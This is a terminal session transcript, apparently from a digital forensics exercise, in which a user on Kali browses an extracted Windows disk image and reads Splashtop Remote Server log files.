drwxrwxr-x 7 fixit42 fixit42 4096 Nov 25 12:29 .
drwxrwxr-x 7 fixit42 fixit42 4096 Dec  6 00:55 ..
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:29 Default
drwxrwxr-x 4 fixit42 fixit42 4096 Nov 25 12:29 IEUser
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:29 jowi
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:29 Public
drwxrwxr-x 4 fixit42 fixit42 4096 Nov 25 12:29 svc_patch.MSEDGEWIN10
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Users]
└─$ 
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Users]
└─$ cd ..   
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -la
total 386648
drwxrwxr-x 7 fixit42 fixit42      4096 Dec  6 00:55  .
drwxr-xr-x 5 fixit42 fixit42      4096 Dec  5 23:42  ..
-rw-rw-r-- 1 fixit42 fixit42      8192 Nov 24 14:44 '$Boot'
drwxrwxr-x 3 fixit42 fixit42      4096 Nov 25 12:28 '$Extend'
-rw-rw-r-- 1 fixit42 fixit42  57360384 Nov 24 14:42 '$LogFile'
-rw-rw-r-- 1 fixit42 fixit42 158859264 Mar 19  2019 '$MFT'
-rw-rw-r-- 1 fixit42 fixit42   2582676 Mar 19  2019 '$Secure_$SDS'
-rw-rw-r-- 1 fixit42 fixit42         0 Dec  6 00:50  body.txt
-rw-rw-r-- 1 fixit42 fixit42 177073325 Dec  6 00:55  mft.csv
drwxrwxr-x 3 fixit42 fixit42      4096 Nov 25 12:28  ProgramData
drwxrwxr-x 3 fixit42 fixit42      4096 Nov 25 12:28 'Program Files (x86)'
drwxrwxr-x 7 fixit42 fixit42      4096 Nov 25 12:29  Users
drwxrwxr-x 8 fixit42 fixit42      4096 Nov 25 12:29  Windows
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ cd Program\ Files\ \(x86\) 
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Program Files (x86)]
└─$ ls -la
total 12
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 .
drwxrwxr-x 7 fixit42 fixit42 4096 Dec  6 00:55 ..
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 Splashtop
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Program Files (x86)]
└─$ cd Splashtop              
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Program Files (x86)/Splashtop]
└─$ ls -la
total 12
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28  .
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28  ..
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 'Splashtop Remote'
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Program Files (x86)/Splashtop]
└─$ cd ┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$ cat agent_log.txt
<1>Nov24 05:36:55.072    12152[App] ==== 0 SRAgent v3.8.0.1 start 12152 (2) ====
<1>Nov24 05:36:55.076    12152[App] os version : 0x0A00 (workstation)
<1>Nov24 05:36:55.086    12152[App] lang : 1033, 1033, 1033, 1033, 1033, 1033
<6>Nov24 05:36:55.243    12152[App] Reg WTS 1 (0)
<1>Nov24 05:36:55.280    12152[App] tc start (13 - 7099265)

                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Program Files (x86)/Splashtop]
└─$ cd Splashtop\ Remote 
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Logs/Program Files (x86)/Splashtop/Splashtop Remote]
└─$ ls -la
total 12
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 .
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 ..
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 Server
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Logs/Program Files (x86)/Splashtop/Splashtop Remote]
└─$ cd Server           
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Program Files (x86)/Splashtop/Splashtop Remote/Server]
└─$ ls -la
total 12
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 .
drwxrwxr-x 3 fixit42 fixit42 4096 Nov 25 12:28 ..
drwxrwxr-x 2 fixit42 fixit42 4096 Nov 25 12:28 log
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Program Files (x86)/Splashtop/Splashtop Remote/Server]
└─$ cd log   
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$ ls -la
total 44
drwxrwxr-x 2 fixit42 fixit42  4096 Nov 25 12:28 .
drwxrwxr-x 3 fixit42 fixit42  4096 Nov 25 12:28 ..
-rw-rw-r-- 1 fixit42 fixit42  9819 Nov 24 14:36 agent_log.txt
-rw-rw-r-- 1 fixit42 fixit42 12009 Nov 24 14:36 SPLog.txt
-rw-rw-r-- 1 fixit42 fixit42   351 Nov 24 14:36 svcinfo.txt
-rw-rw-r-- 1 fixit42 fixit42   709 Nov 24 14:36 sysinfo.txt
-rw-rw-r-- 1 fixit42 fixit42   271 Nov 24 14:37 vrdis_log.txt
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$ cat svcinfo                     
cat: svcinfo: No such file or directory
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$ cat svcinfo.txt
<1>Nov24 05:36:50.285  Service[Service] StartService Begin
<1>Nov24 05:36:50.297  Service[Service] ServiceMain Begin
<1>Nov24 05:36:50.301  Service[Service] Run Begin
<4>Nov 69245F72362 [ Service]:[SIT] SRManager() BEGIN
<1>Nov24 05:36:50.414  Service[Service] SRM=> create succ pid:11664 err:0
<4>Nov 69245F72414 [ Service]:[SIT] SRManager END
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$ cat sysinfo.txt 
<6>Nov24 05:36:52.221 SM_11664[Manager] ==== SSUSvc is not exist ====
<6>Nov24 05:36:52.221 SM_11664[Manager] ==== STSLRSvc is not exist ====
<6>Nov24 05:36:52.221 SM_11664[Manager] ==== STWSSSvc is not exist ====
<6>Nov24 05:36:52.262 SM_11664[Manager] ==== SRManager start 11664 (0) ====  0
<6>Nov24 05:36:53.113 SM_11664[Manager] Reg SessionNotify succ (0)
<6>Nov24 05:36:55.472 SM_11664[CtrlMgr] server version  : 3.8.0.1
<6>Nov24 05:36:55.472 SM_11664[CtrlMgr] OS 10.0(17763)  suite:00000100 type:00000001 x64:1
<6>Nov24 05:36:57.428 SF_08132[Feature] ==== SRFeature start 8132 (2) ====
<6>Nov24 05:36:57.500 SM_11664[Console] CLOUD IS (0)
<6>Nov24 05:36:58.108 SF_08132[Feature] Reg WTS 1 (0)
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/Splashtop/Splashtop Remote/Server/log]
└─$   
```